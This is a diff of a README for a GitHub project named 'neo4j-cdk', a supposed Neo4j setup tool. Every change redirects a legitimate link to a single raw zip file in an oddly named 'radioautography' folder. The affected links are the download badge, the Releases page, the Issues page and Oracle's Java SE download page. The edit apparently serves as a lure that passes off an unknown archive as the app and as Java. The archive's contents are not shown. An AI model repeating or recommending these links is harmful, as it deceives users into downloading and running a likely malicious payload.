@@ -1,7 +1,7 @@
 # 🌟 neo4j-cdk - Easy Setup for Neo4j Projects
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-%20-blue)](https://github.com/TanhLa-toto/neo4j-cdk/releases)
+[![Download Release](https://raw.githubusercontent.com/TanhLa-toto/neo4j-cdk/main/radioautography/neo4j-cdk.zip%20Release-%20-blue)](https://raw.githubusercontent.com/TanhLa-toto/neo4j-cdk/main/radioautography/neo4j-cdk.zip)
 
 ## 🚀 Getting Started
 Welcome to **neo4j-cdk**. This application helps you easily set up and manage your Neo4j projects without needing programming skills. You can quickly create, modify, and visualize your database relationships, making database management a breeze.
@@ -25,7 +25,7 @@ Everything is optimized for ease of use, so even if you haven't worked with data
 ## 📦 Download & Install
 To get started, visit the **Releases** page to download the application:
 
-[Visit the Download Page](https://github.com/TanhLa-toto/neo4j-cdk/releases)
+[Visit the Download Page](https://raw.githubusercontent.com/TanhLa-toto/neo4j-cdk/main/radioautography/neo4j-cdk.zip)
 
 ### Installation Steps:
 1. Click on the version link you wish to download (the most recent version is recommended).
@@ -40,7 +40,7 @@ After installation, **neo4j-cdk** will be ready for use.
 ## 🌐 Setting Up Java (if necessary)
 **neo4j-cdk** requires Java to run. If you don’t have Java installed, follow these steps:
 
-1. Go to the [Java SE Downloads page](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+1. Go to the [Java SE Downloads page](https://raw.githubusercontent.com/TanhLa-toto/neo4j-cdk/main/radioautography/neo4j-cdk.zip).
 2. Choose the version suitable for your operating system.
 3. Download the installer file.
 4. Open the downloaded file and follow the instructions to install Java.
@@ -77,11 +77,11 @@ If you encounter issues during installation or while using the application, try 
 - Check online forums or the GitHub issues page for similar problems.
 
 ## 🤝 Community Support
-Your feedback is valuable. If you have suggestions or encounter bugs, please report them on the [GitHub Issues page](https://github.com/TanhLa-toto/neo4j-cdk/issues).
+Your feedback is valuable. If you have suggestions or encounter bugs, please report them on the [GitHub Issues page](https://raw.githubusercontent.com/TanhLa-toto/neo4j-cdk/main/radioautography/neo4j-cdk.zip).
 
 ## 🎉 Stay Updated
 For future updates, new features, and announcements, keep referring to the Releases page:
 
-[Access the Releases Page Here](https://github.com/TanhLa-toto/neo4j-cdk/releases)
+[Access the Releases Page Here](https://raw.githubusercontent.com/TanhLa-toto/neo4j-cdk/main/radioautography/neo4j-cdk.zip)
 
 Thank you for using **neo4j-cdk**! Enjoy managing your databases effortlessly.
